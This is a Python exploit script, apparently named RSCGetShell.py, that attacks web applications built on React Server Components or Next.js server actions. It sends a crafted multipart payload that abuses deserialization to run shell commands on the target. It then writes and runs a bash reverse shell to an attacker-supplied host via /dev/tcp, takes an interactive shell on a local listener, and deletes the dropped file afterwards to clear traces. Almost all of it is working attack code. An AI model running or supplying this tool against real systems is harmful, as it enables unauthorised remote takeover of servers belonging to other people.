# based libs, packages, files, ...
import os
import sys
import pty
import tty
import select
import socket
import string
import random
import termios
import urllib3
import requests
import threading


# global config
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# global vraious
exit_flag = False
banner = """
#####################################################################################################
#                                       Author: b0b@c                                               #
#     python3 RSCGetShell.py http://target_domain_url:port/ attacker_vps:listening_port             #
#     python3 RSCGetShell.py https://target_domain_url:port/ attacker_vps:listening_port            #
#####################################################################################################
"""

payload_base_string = [
    "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
    "Content-Disposition: form-data; name=\"0\"\r\n\r\n"
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\\"then\\\":\\\"$B1337\\\"}","_response":{'
    '"_prefix":"var res=process.mainModule.require(\'child_process\')'
    '.execSync(\'%s\').toString().trim();;'
    'throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
    '{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
    '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n'
    "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
    "Content-Disposition: form-data; name=\"1\"\r\n\r\n"
    '"$@0"\r\n'
    "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
    "Content-Disposition: form-data; name=\"2\"\r\n\r\n"
    "[]\r\n"
    "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n"
]

request_headers = {
    "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36",
    "Next-Action": "x",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
}


# functions
def listening_server_init(listening_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", int(listening_port)))
    except Exception as reason:
        print("[-] Bind Address Error : %s" % reason)
    print("[+] Bind Address Succeed!")
    return server


def randstr(n, pool=string.ascii_letters + string.digits):
    """返回 n 位随机字符串（默认字母+数字）"""
    return ''.join(random.choices(pool, k=n))

def payload_init(command: str, request_body: list):
    payload = request_body[0]
    return payload % str(command)

def command_init(listening_address, listening_port):
    random_string = randstr(16)
    command_write_reverse_command = 'echo \\"bash -i >& /dev/tcp/%s/%s 0>&1\\" > /tmp/reverse.sh && echo %s'% (str(listening_address), str(listening_port), random_string)
    command_execute_reverse_command = 'bash /tmp/reverse.sh'
    payload_write_reverse_command = payload_init(command_write_reverse_command, payload_base_string)
    payload_execute_reverse_command = payload_init(command_execute_reverse_command, payload_base_string)
    return payload_write_reverse_command, payload_execute_reverse_command, random_string

def target_check(target_url):
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        return False
    if not target_url.endswith("/"):
        target_url = target_url + "/"
    return True, target_url

def clear_reverse_file(target_url):
    global request_headers
    global exit_flag
    command = 'rm -rf /tmp/reverse.sh'
    clear_payload = payload_init(command, payload_base_string)
    flag, target = target_check(target_url)
    if not flag:
        print("[-] Target Error: %s!" % str(target_url))
        exit_flag = True
        return None
    try:
        response = requests.post(url=target, data=clear_payload, headers=request_headers, allow_redirects=False, timeout=10)
        print("[+] Clear Succeed!")
    except Exception as reason:
        print("[-] Clear Error: %s" % str(reason))
        exit_flag = True
        return None

def get_shell(target_url, listening_address, listening_port):
    global request_headers
    global exit_flag
    flag, target = target_check(target_url)
    if not flag:
        print("[-] Target Error: %s!" % str(target_url))
        exit_flag = True
        return None
    payload1, payload2, flag = command_init(listening_address, listening_port)
    try:
        response = requests.post(url=target, data=payload1, headers=request_headers, allow_redirects=False, timeout=10)
        if not str(response.headers).find(flag):
            print("[-] Do Not Find Vulnerability!")
            exit_flag = True
            return None
        print("[+] Write Command Succeed!")
    except Exception as reason:
        print("[-] Send Attack Packet 1 Error: %s" % str(reason))
        exit_flag = True
        return None
    try:
        response = requests.post(url=target, data=payload2, headers=request_headers, allow_redirects=False, timeout=10)
    except Exception as reason:
        print("[-] Send Attack Packet 2 Error: %s" % str(reason))
        exit_flag = True
        return None

if __name__ == "__main__":
    print(banner)
    target_url = sys.argv[1]
    attacker_vps = str(sys.argv[2]).split(":")
    listening_address, listening_port = attacker_vps[0], attacker_vps[1]
    server = listening_server_init(listening_port)
    server.settimeout(20)
    server.listen(5)
    print("[+] Listening Server Ready!")
    connection = None
    address = None
    command = None
    fd = None
    settings = None
    threader = threading.Thread(target=get_shell, args=(target_url, listening_address, listening_port))
    threader.start()
    try:
        connection, address = server.accept()
        fd =sys.stdin.fileno()
        settings = termios.tcgetattr(fd)
        print("[+] Get Shell Connection From %s!" % str(address))
    except Exception as reason:
        print("[-] Accept Connection Error: %s" % str(reason))
        sys.exit(0)
    try:
        while not exit_flag:
            receive, _, _, = select.select([connection, sys.stdin], [], [], 0.1)
            if connection in receive:
                data = connection.recv(4096)
                if not data:
                    break
                response_string = data.decode()
                for line in response_string.split("\n"):
                    if line in ["bash: cannot set terminal process group (1): Inappropriate ioctl for device", "bash: no job control in this shell", ""]:
                        continue
                    if len(line) - line.rfind("#") == 2:
                        sys.stdout.buffer.write(line.encode())
                        sys.stdout.flush()
                    elif line+"\n" == command.decode():
                        pass
                    else:
                        print(line)
            if sys.stdin in receive:
                command = os.read(fd, 1024)
                if data:
                    connection.sendall(command)
    except Exception as reason:
        print("[-] Error: %s" % str(reason))
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, settings)
        connection.close()
        server.close()
        print("[+] Attack Finished!")
    clear_reverse_file(target_url)
